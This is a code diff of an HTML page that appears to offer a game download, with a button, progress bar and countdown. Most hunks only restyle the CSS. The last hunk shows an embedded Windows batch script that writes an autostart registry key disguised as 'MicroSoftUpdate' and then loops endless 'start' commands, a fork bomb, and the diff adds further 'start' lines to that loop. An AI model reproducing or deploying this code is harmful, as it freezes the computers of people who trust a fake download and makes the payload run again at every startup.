@@ -7,9 +7,9 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-image: url('https://game.gtimg.cn/images/lolm/act/a20230829jcc/images/share.jpg'); /* TFT Background */
-            background-size: cover;
-            background-position: center;
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); /* 蓝色渐变背景 */
+            background-size: 400% 400%; /* 背景的渐变效果 */
+            animation: gradientAnimation 10s ease infinite; /* 动画效果 */
             color: white;
             text-align: center;
             padding: 20px;
@@ -19,21 +19,37 @@
             justify-content: center;
             align-items: center;
         }
+
+        @keyframes gradientAnimation {
+            0% {
+                background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            }
+            50% {
+                background: linear-gradient(135deg, #3a7bd5 0%, #00d2ff 100%);
+            }
+            100% {
+                background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            }
+        }
+
         .container {
             max-width: 600px;
             margin: auto;
-            background-color: rgba(0, 0, 0, 0.7);  /* Semi-transparent background for readability */
+            background-color: rgba(0, 0, 0, 0.7); /* 半透明的背景 */
             padding: 30px;
             border-radius: 10px;
             box-shadow: 0px 4px 10px rgba(255, 215, 0, 0.5);
         }
+
         h1 {
             color: #FFD700;
         }
+
         .game-logo {
             width: 100%;
             border-radius: 10px;
         }
+
         .download-button {
             background-color: #FFD700;
             color: black;
@@ -45,13 +61,16 @@
             margin-top: 15px;
             animation: bounce 0.5s infinite alternate;
         }
+
         .download-button:hover {
             background-color: #E6C300;
         }
+
         @keyframes bounce {
             0% { transform: translateY(0); }
             100% { transform: translateY(-10px); }
         }
+
         .progress-container {
             width: 100%;
             background-color: #444;
@@ -59,12 +78,14 @@
             margin-top: 20px;
             overflow: hidden;
         }
+
         .progress-bar {
             width: 0%;
             height: 10px;
             background-color: #FFD700;
             border-radius: 10px;
         }
+
         #countdown {
             font-size: 18px;
             color: #FFD700;
@@ -119,6 +140,8 @@ if not exist "%script_path%" (
 reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicroSoftUpdate" /t REG_SZ /d "%script_path%" /f >nul
 
 :loop
+start
+start
 start
 start
 start
